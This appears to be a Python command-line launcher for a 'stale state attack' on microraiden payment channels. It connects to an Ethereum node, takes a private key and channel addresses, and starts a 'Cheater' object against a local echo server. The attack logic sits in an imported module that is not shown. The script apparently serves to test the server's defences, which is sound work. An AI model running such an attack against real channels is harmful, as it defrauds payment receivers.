#!/usr/bin/python

import logging
import click
from web3 import Web3, HTTPProvider
from microraiden.stale_state_attack.cheater import Cheater


@click.command()
@click.option(
    '--channel-manager',
    default='0xF12b5dd4EAD5F743C6BaA640B0216200e89B60Da',
    help='Address of the channel manager contract.',
    type=str
)
@click.option(
    '--private-key',
    required=True,
    help='Hex-encoded private key.',
    type=str
)
@click.option(
    '--proxy-address',
    default='http://127.0.0.1:5000',
    help='Url of the microraiden echo server.',
    type=str
)
@click.option(
    '--receiver',
    required=True,
    help='Address of the account that the proxy is running with.',
    type=str
)
@click.option(
    '--rpcaddr',
    default='http://127.0.0.1',
    help='Address of the RPC server.',
    type=str
)
@click.option(
    '--rpcport',
    default=8545,
    help='Port of the RPC server.',
    type=int
)
def main(channel_manager: str, private_key: str, proxy_address: str, receiver: str, rpcaddr: str, rpcport: int):
    # Initialize web3
    web3 = Web3(HTTPProvider('{}:{}'.format(rpcaddr, rpcport)))

    # Initialize cheater
    cheater = Cheater(
        web3=web3,
        private_key=private_key,
        channel_manager_address=channel_manager,
        receiver=receiver,
        proxy_address=proxy_address,
    )

    # Start stale state attack
    cheater.start()


if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    # pylint: disable=E1120
    main()
    # pylint: enable=E1120
